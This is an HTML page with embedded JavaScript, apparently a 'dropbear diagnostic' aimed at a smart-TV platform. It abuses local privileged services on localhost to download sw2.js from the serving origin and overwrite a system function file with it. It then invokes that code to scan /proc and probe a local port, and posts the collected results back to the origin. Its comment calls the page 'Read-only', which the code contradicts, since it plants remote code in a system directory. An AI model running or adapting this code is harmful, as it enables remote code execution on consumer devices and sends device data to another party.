<!doctype html>
<!-- dropbear local-lane diagnostic for 55E7QTUK: re-fetch the diagnostic
     sw2 function (the FaaS caches modules loaded per-invocation path —
     stale modules get the OLD behavior), then invoke: the function scans
     /proc for dropbear processes and ties a local 127.0.0.1:8008 banner
     read. Read-only. -->
<html><head><meta charset="utf-8"><title>dbe diag 2</title></head>
<body><pre id="out">dbe diag 2…</pre><script>
(function(){
 "use strict";
 var out=document.getElementById("out");
 var report={started:new Date().toISOString(),steps:{}};
 function save(){try{var x=new XMLHttpRequest();x.open("POST","/api/probe",true);x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify(report));}catch(e){}}
 function line(t){out.textContent=out.textContent+"\n"+t;}
 function syncExec(svc,obj){try{return vowOS.service.syncExecute(svc,obj);}catch(e){return{ret:false,msg:"EXC "+e.message};}}
 var BASE=location.origin+"/pub/";
 var FN="http://localhost:9009/function/basic/fetch/sw2";
 function startFetcher(){return new Promise(function(res){var done=false;function fin(v){if(!done){done=true;res(v);}}
   try{var ws=new WebSocket("wss://localhost:9888");
     ws.onopen=function(){ws.send(JSON.stringify({path:"phoenix://service/basic/fetcher",method:"start",parameters:{},session:901,timeout:10}));setTimeout(function(){try{ws.close();}catch(e){}fin("ok");},1200);};
     ws.onerror=function(){fin("ws err");};setTimeout(function(){fin("timeout");},5000);
   }catch(e){fin("EXC "+e.message);}});}
 setTimeout(function(){
  startFetcher().then(function(s0){
   report.steps.start=s0; line("fetcher "+s0);
   setTimeout(function(){
    report.steps.sw2fetch=syncExec("basic/fetcher",{api:"fetchFile",
      args:JSON.stringify({url:BASE+"sw2.js",directory:"/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/sw2.js",permission:420})});
    line("sw2fetch: "+JSON.stringify(report.steps.sw2fetch));
    setTimeout(function(){
     var x=new XMLHttpRequest();x.open("POST",FN,true);x.setRequestHeader("Content-Type","application/json");
     x.onload=function(){report.steps.dbe=String(x.responseText||"").slice(0,4000);line("dbe: "+report.steps.dbe.slice(0,1400));setTimeout(save,400);};
     x.onerror=function(){report.steps.dbe="xhr err";save();};
     x.send(JSON.stringify({}));
    },1800);
   },1800);
  });
 },300);
})();
</script></body></html>
